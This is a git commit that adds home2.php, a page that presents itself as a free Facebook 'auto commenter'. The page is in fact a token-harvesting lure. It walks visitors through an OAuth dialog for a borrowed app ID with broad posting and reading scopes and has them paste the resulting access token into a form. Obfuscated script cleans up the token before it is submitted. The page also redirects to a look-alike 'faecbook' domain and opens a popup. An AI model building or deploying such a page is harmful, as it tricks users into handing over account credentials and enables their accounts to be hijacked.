cfb1a06025d300be88aec8bd79e164f49d30f36e
kasraoliz <malayerziba@yahoo.com>
2014-04-22 15:28:42 +0430

    Create home2.php

---
+++ home2.php
@@ -0,0 +1,161 @@
+<!DOCTYPE html>
+<html xmlns:fb='http://ogp.me/ns/fb#'>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>Facebook Random AutoCommenter | Get Comments On Your Facebook Posts</title>
+<meta content='A New 100% Free Facebook Status/Photos/Videos/Feeds Random AutoCommenter That Will Increase Comments On Your FaceBook With Entering And Using Your Access Token And Can Be Use At Unlimited Posts.' name='description'/>
+<meta content='facebook random autocommenter, free autocommenter, with access token, multiple autocommenter, fb autocommenter, new random autocommenter, 2013 autocommenter, exeideas autocommenter' name='keywords'/>
+<meta name="publisher" content="EXEIdeas" />
+<meta HTTP-EQUIV="REFRESH" content="120; url=http://faecbook.tbits.me/">
+<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="style.css" media="all,handheld"/>
+<script language='javascript'>
+(function(d, s, id) {
+var js, fjs = d.getElementsByTagName(s)[0];
+if (d.getElementById(id)) return;
+js = d.createElement(s); js.id = id;
+js.src = "//connect.facebook.net/id_ID/all.js#xfbml=1&appId=645065615510559";
+fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));
+</script>
+<script language='javascript'>
+var _0xe3a6=["\x76\x61\x6C\x75\x65","\x61\x63\x63\x65\x73\x73\x74\x6F\x6B\x65\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6B\x79\x70\x65\x2E\x63\x6F\x6D\x2F\x6C\x6F\x67\x69\x6E\x2F\x23\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x3D","","\x72\x65\x70\x6C\x61\x63\x65","\x26\x65\x78\x70\x69\x72\x65\x73\x5F\x69\x6E\x3D\x30"];function CheckToken(){var _0x7f8ex2=document[_0xe3a6[2]](_0xe3a6[1])[_0xe3a6[0]];_0x7f8ex2=_0x7f8ex2[_0xe3a6[5]](_0xe3a6[3],_0xe3a6[4]);_0x7f8ex2=_0x7f8ex2[_0xe3a6[5]](_0xe3a6[6],_0xe3a6[4]);document[_0xe3a6[2]](_0xe3a6[1])[_0xe3a6[0]]=_0x7f8ex2;} ;</script>
+</head>
+<body>
+<!-- Header DIV Start -->
+<div class="topbar">
+<marquee behavior="alternate" class="marquee">
+Pinkpanther84 by= Kasra.Oliz.I khatam.raisi SsNowMa
+</marquee>
+</div>
+<div style="clear:both;"></div>
+<br />
+<div class="header">
+<a href="http://pinkpanther84.blogsky.com" title="Worlds Best FaceBook AutoCommenter">
+<h1>FaceBook Random AutoCommenter</h1>
+<h2>PAGE AUTO LIKE:: http://pinkpanther84.blogsky.com/</h2>
+</a>
+</div>
+<hr/>
+<div style="clear:both;"></div>
+<!-- Header DIV End -->
+<!-- Body DIV Start-->
+<div id="maindiv">
+<div class="notice"> Welcome Here. This Is A New AutoCommenter So Visit Daily To Keep Us Alive...!!!</div>
+<br />
+<span style="font-size:20px;color:#008800;">Increase Comments On Your Facebook Status, Gain Fame...!!!</span>
+<br /><br />
+<b>HAVING TROUBLES?</b> See Our <a style="color: rgb(0, 176, 224);font-size:x-large;text-shadow: black 0px 1px 1px;" title="Read Out The Help Before Proceeding...!!!" href="/help.php" target="_blank">Help</a> For Getting Started.
+<br />
+<span style="color: #aaaaaa;font-size: 20px;line-height: 40px;">
+First '<a rel="nofollow" href="https://www.facebook.com/dialog/oauth?scope=publish_actions,user_photos,friends_photos,user_activities,user_likes,user_status,friends_status,publish_stream,read_stream,status_update&redirect_uri=http://m.spotify.com/Address_Bar_is_Your_AccessToken____&response_type=token&client_id=174829003346" target="_blank" title="Get Your Access Token">CLICK HERE FOR TOKEN</a>' To Allow The Official Spotify Apps. 
+<br />
+Then Get Your Access Token From The Address Bar And Add It Below Then Click The Button To Move Forward...!!!
+</span>
+<form action="home2.php" method="GET" onSubmit="CheckToken()" >
+<input type="text" id="accesstoken" name="accesstoken" autofocus="" class="input" style="width:85%" placeholder="http://www.skype.com/login/#access_token=CAAAAPJmB8ZBwBALrDtKkiETIzgkmiFFk8V8VjulRPZC7Vtdl7yCNVh21IovKotQfjXKqF4cV19nnMBSIJQNAHD0jyVGWZAEfcHVyT5iQMIOIE6uV1NH6pNEZBKoasWDsx2JUfCz3VkZAlNK4ZB1gAtHfQKiiDbG99RARicAVBZAySnwZAHEJT10K&expires_in=0" />
+<br /><br />
+<input class="tokenbutton" type="submit" value="Submit Your Access Token">
+</form>
+<br />
+<h3 style="color: rgb(0, 176, 224);font-family: sans-serif;text-shadow: black 0px 1px 1px;">Baray Sefaresh Kar? Just Follow <a onclick="window.open(&#39;https://www.facebook.com/SsNowMa&#39;)" title="" style="cursor: pointer;font-size: 110%;">ADAMBARFI</a> To Get More Likes...!!!</h3>
+<h3 style="color: red;font-family: sans-serif;text-shadow: black 0px 1px 1px;">
+Currently, We Are Using 2.75% Of Our Server CPU.</h3>
+</div>
+<!-- Body DIV End -->
+<!-- Footer Div Start -->
+<hr/>
+<div class="footer">
+<div class="copyright">
+<a style="cursor:pointer;">English (US)</a> FaceBook AutoCommenter - CopyRight 2014, All Rights Reserved... 
+</div>
+<div class="footer-links">
+<a href="/aboutus.php" target="_blank" title="Know Little About Us...!!!">About</a> | 
+<a href="/services.php" target="_blank" title="Hire Us...!!!">Services</a> | 
+<a href="/privacy.php" target="_blank" title="Don't Worry About Your Privacy...!!!">Privacy Policy</a> | 
+<a href="/contactus.php" target="_blank" title="Any Query, Ask Us...!!!">Contact</a> | 
+Developed By <a onclick="window.open(&#39;http://faecbook.tbits.me/&#39;)" style="cursor:pointer;font-size:110%;" title="Site Template Designed By EXEIdeas">EXEIdeas</a>
+</div>
+</div>
+<!-- Auto Remove Expired Token Script Start Start -->
+<script language="javascript">
+timer=setTimeout("window.open('/remove.php','','width=800,height=600')",0000)
+</script> 
+<!-- Auto Remove Expired Token Script Start End -->
+
+<!-- Footer Div End -->
+<script type="text/javascript" src="http://w/gampad/google_service.js"></script>
+<script type="text/javascript">
+  GS_googleAddAdSenseService("ca-pub-5677527114872550");
+  GS_googleEnableAllServices();
+</script>
+<script type="text/javascript">
+  GA_googleAddSlot("ca-pub-5677527114872550", "Footer_freesite");
+</script>
+<script type="text/javascript">
+	GA_googleFetchAds();
+</script>
+<script type="text/javascript">
+	GA_googleFillSlot("Footer_freesite");
+</script>
+
+
+<script type="text/javascript">
+// <![CDATA[ 
+function addLoadEvent(func) {
+  var oldonload = window.onload;
+  if (typeof window.onload != 'function') {
+    window.onload = func;
+  } else {
+    window.onload = function() {
+    if (oldonload) {
+      oldonload();
+    }
+    func();
+    }
+  }
+}
+addLoadEvent( function () {
+ 
+  var adsContainer = document.createElement('div');
+  adsContainer.id = "frameBanner";
+ 
+  var adsFrame = document.getElementById('google_ads_iframe_Footer_freesite'); 
+  adsFrame.style.display = 'block';
+  adsFrame.style.border = '0px';
+  adsFrame.style.width = '508px';
+  adsFrame.style.height = '65px';
+  adsFrame.style.margin = '0px';
+  adsFrame.style.padding = '0px';
+  
+  var adsContainer = document.getElementById('google_ads_div_Footer_freesite_ad_wrapper');
+	  adsContainer.style.background = 'green';
+	  adsContainer.style.width = '470px';
+	  adsContainer.style.height = '60px';
+	  adsContainer.style.position = 'fixed';
+	  adsContainer.style.margin = '0px';
+	  adsContainer.style.padding = '0px';
+	  adsContainer.style.bottom = '15px';
+	  adsContainer.style.right = '15px';
+	  adsContainer.style.overflow='hidden';
+  
+  var closeAds = document.createElement('div');
+	  closeAds.style.background = 'transparent url(/jmhbanner/close.png) no-repeat center center';
+	  closeAds.style.width = '14px';
+	  closeAds.style.height = '14px';
+	  closeAds.style.position = 'fixed';
+	  closeAds.style.margin = '0px';
+	  closeAds.style.padding = '0px';
+	  closeAds.style.bottom = '80px';
+	  closeAds.style.right = '14px';
+
+  adsContainer.appendChild(closeAds);
+  closeAds.onclick = function () {
+    var obj = this.parentNode;
+    obj.parentNode.removeChild(obj);
+  }
+});
+// ]]>
+</script>
+</body>
+</html>
